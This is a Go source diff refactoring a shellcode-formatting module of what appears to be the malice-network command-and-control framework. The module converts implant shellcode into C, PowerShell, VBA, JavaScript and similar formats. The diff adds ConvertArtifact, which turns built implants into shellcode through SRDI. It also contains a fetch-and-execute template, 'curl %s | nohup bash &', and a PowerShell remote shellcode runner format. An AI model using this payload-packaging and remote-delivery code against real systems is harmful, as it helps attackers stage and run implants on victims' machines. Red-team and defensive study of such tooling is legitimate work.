@@ -3,6 +3,12 @@ package formatutils
 import (
 	"encoding/base64"
 	"fmt"
+	"github.com/chainreactors/malice-network/helper/consts"
+	"github.com/chainreactors/malice-network/helper/cryptography"
+	"github.com/chainreactors/malice-network/helper/encoders"
+	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
+	"os"
+	"path/filepath"
 	"strings"
 )
 
@@ -19,176 +25,104 @@ type FormatInfo struct {
 	Usage         func(string) string
 }
 
-type Formatter struct {
-	SupportedFormats map[string]FormatInfo
-}
+type Formatter map[string]*FormatInfo
 
-// NewFormatter creates a new formatter with all supported formats
-func NewFormatter() *Formatter {
-
-	formatter := &Formatter{
-		SupportedFormats: make(map[string]FormatInfo),
-	}
-
-	formatter.register("executable", FormatInfo{
+var SupportedFormats = Formatter{
+	consts.FormatExecutable: {
 		Extension: ".exe", Desc: "executable format", Converter: func(data []byte) []byte { return data },
-	})
-
-	// Register all supported formats with descriptions
-	formatter.register("raw", FormatInfo{
+	},
+	consts.FormatRaw: {
 		Extension: ".bin", Desc: "raw binary format", Converter: func(data []byte) []byte { return data },
-	})
-
-	formatter.register("c", FormatInfo{
+	},
+	consts.FormatC: {
 		Extension: ".c", Desc: "C language format", Converter: toC,
-	})
-	formatter.register("csharp", FormatInfo{
+	},
+	consts.FormatCSharp: {
 		Extension: ".cs", Desc: "C# language format", Converter: toCSharp,
-	})
-	formatter.register("java", FormatInfo{
+	},
+	consts.FormatJava: {
 		Extension: ".java", Desc: "Java language format", Converter: toJava,
-	})
-
-	formatter.register("golang", FormatInfo{
+	},
+	consts.FormatGolang: {
 		Extension: ".go", Desc: "Go language format", Converter: toGo,
-	})
-
-	formatter.register("python", FormatInfo{
+	},
+	consts.FormatPython: {
 		Extension: ".py", Desc: "Python language format", Converter: toPython,
-	})
-
-	formatter.register("perl", FormatInfo{
+	},
+	consts.FormatPerl: {
 		Extension: ".pl", Desc: "Perl language format", Converter: toPerl,
-	})
-
-	formatter.register("ruby", FormatInfo{
+	},
+	consts.FormatRuby: {
 		Extension: ".rb", Desc: "Ruby language format", Converter: toRuby,
-	})
-
-	formatter.register("bash", FormatInfo{
+	},
+	consts.FormatBash: {
 		Extension: ".sh", Desc: "Bash script format", Converter: toBash,
-	})
-
-	formatter.register("powershell", FormatInfo{
+	},
+	consts.FormatPowerShell: {
 		Extension: ".ps1", Desc: "PowerShell script format", Converter: toPowerShell,
-	})
-
-	formatter.register("hex-oneline", FormatInfo{
+	},
+	consts.FormatHexOneLine: {
 		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexOneLine,
-	})
-	formatter.register("hex-multiline", FormatInfo{
+	},
+	consts.FormatHexMultiLine: {
 		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexMultiLine,
-	})
-
-	formatter.register("num", FormatInfo{
+	},
+	consts.FormatNum: {
 		Extension: ".txt", Desc: "numeric format", Converter: toNum,
-	})
-
-	formatter.register("dword", FormatInfo{
+	},
+	consts.FormatDword: {
 		Extension: ".txt", Desc: "dword format", Converter: toDword,
-	})
-
-	formatter.register("js_be", FormatInfo{
+	},
+	consts.FormatJavaScriptBE: {
 		Extension: ".js", Desc: "JavaScript big-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, true) },
-	})
-	formatter.register("js_le", FormatInfo{
+	},
+	consts.FormatJavaScriptLE: {
 		Extension: ".js", Desc: "JavaScript little-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, false) },
-	})
-
-	formatter.register("vbscript", FormatInfo{
+	},
+	consts.FormatVBScript: {
 		Extension: ".vbs", Desc: "VBScript format", Converter: toVBScript,
-	})
-	formatter.register("vbapplication", FormatInfo{
+	},
+	consts.FormatVBApplication: {
 		Extension: ".vba", Desc: "VBA application format", Converter: toVBApplication,
-	})
-
-	formatter.register("powershell-remote", FormatInfo{
+	},
+	consts.FormatPowerShellRemote: {
 		Extension: ".ps1", Desc: "Execute ShellCode By PowerShell",
 		Converter:     toPowershellRemote,
 		SupportRemote: true,
 		Usage:         PowershellRemoteUsage,
-	})
-
-	formatter.register("curl-remote", FormatInfo{
+	},
+	consts.FormatCurlRemote: {
 		Extension: ".bash", Desc: "Execute ELF by curl",
 		Converter:     toPowershellRemote,
 		SupportRemote: true,
 		Usage:         CurlRemoteUsage,
-	})
-
-	return formatter
-}
-
-// register adds a format to the supported formats map
-func (f *Formatter) register(name string, info FormatInfo) {
-	f.SupportedFormats[strings.ToLower(name)] = info
-}
-
-// GetSupportedFormats returns a list of all supported format names
-func (f *Formatter) GetSupportedFormats() []string {
-	formats := make([]string, 0, len(f.SupportedFormats))
-	for format := range f.SupportedFormats {
-		formats = append(formats, format)
-	}
-	return formats
-}
-
-// IsSupported checks if a format is supported
-func (f *Formatter) IsSupported(format string) bool {
-	_, exists := f.SupportedFormats[strings.ToLower(format)]
-	return exists
-}
-
-// GetFormatDescription returns the description for a specific format
-func (f *Formatter) GetFormatDescription(format string) string {
-	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
-		return info.Desc
-	}
-	return format + " format"
+	},
 }
 
 // GetFormatsWithDescriptions returns a map of format names to descriptions
-func (f *Formatter) GetFormatsWithDescriptions() map[string]string {
+func GetFormatsWithDescriptions() map[string]string {
 	result := make(map[string]string)
-	for format, info := range f.SupportedFormats {
+	for format, info := range SupportedFormats {
 		result[format] = info.Desc
 	}
 	return result
 }
 
-func (f *Formatter) GetFormatsSupportRemote() map[string]string {
-	result := make(map[string]string)
-	for format, info := range f.SupportedFormats {
-		if info.SupportRemote {
-			result[format] = info.Desc
-		}
-	}
-	return result
-}
-
-func (f *Formatter) IsSupportedRemote(format string) bool {
-	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
+func IsSupportedRemote(format string) bool {
+	if info, exists := SupportedFormats[strings.ToLower(format)]; exists {
 		return info.SupportRemote
 	}
 	return false
 }
 
-// GetFormatExtension returns the file extension for a specific format
-func (f *Formatter) GetFormatExtension(format string) string {
-	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
-		return info.Extension
-	}
-	return ".txt"
-}
-
 // Convert converts raw shellcode bytes to the specified format
-func (f *Formatter) Convert(data []byte, format string) (*FormatResult, error) {
+func (formatter Formatter) Convert(data []byte, format string) (*FormatResult, error) {
 	if len(data) == 0 {
 		return nil, fmt.Errorf("empty data")
 	}
 
-	formatInfo, exists := f.SupportedFormats[strings.ToLower(format)]
-	if !exists {
+	formatInfo := formatter[strings.ToLower(format)]
+	if formatInfo == nil {
 		return nil, fmt.Errorf("unsupported format: %s", format)
 	}
 
@@ -197,6 +131,36 @@ func (f *Formatter) Convert(data []byte, format string) (*FormatResult, error) {
 		Data:      convertedData,
 		Extension: formatInfo.Extension,
 	}, nil
+}
+
+func Convert(data []byte, format string) (*FormatResult, error) {
+	return SupportedFormats.Convert(data, format)
+}
+
+func ConvertArtifact(artifact *clientpb.Artifact, format string) (*clientpb.Artifact, error) {
+	if format == "" || format == consts.FormatExecutable {
+		return artifact, nil
+	}
+
+	filename := filepath.Join(encoders.UUID())
+	if err := os.WriteFile(filename, artifact.Bin, 0644); err != nil {
+		return nil, err
+	}
+	shellcode, err := SRDIArtifact(filename, artifact.Platform, artifact.Arch, artifact.Type == consts.CommandBuildPulse)
+	if err != nil {
+		return nil, fmt.Errorf("failed to convert: %s", err)
+	}
+	if err := os.Remove(filename); err != nil {
+		return nil, fmt.Errorf("failed to remove file: %s", err)
+	}
+	convert, err := Convert(shellcode, format)
+	if err != nil {
+		return nil, err
+	}
+
+	artifact.Bin = convert.Data
+	artifact.Format = format
+	return artifact, nil
 }
 
 // Helper functions for format conversion
@@ -509,4 +473,13 @@ func PowershellRemoteUsage(powershellURL string) string {
 func CurlRemoteUsage(url string) string {
 	template := `curl %s | nohup bash &`
 	return fmt.Sprintf(template, url)
+}
+
+func Encode(name, format string) string {
+	encryptArtifactName, _ := cryptography.EncryptWithGlobalKey([]byte(name))
+	hexEncryptArtifactName := cryptography.BytesToHex(encryptArtifactName)
+
+	encryptFormat, _ := cryptography.EncryptWithGlobalKey([]byte(format))
+	hexEncryptFormat := cryptography.BytesToHex(encryptFormat)
+	return hexEncryptArtifactName + "/" + hexEncryptFormat
 }
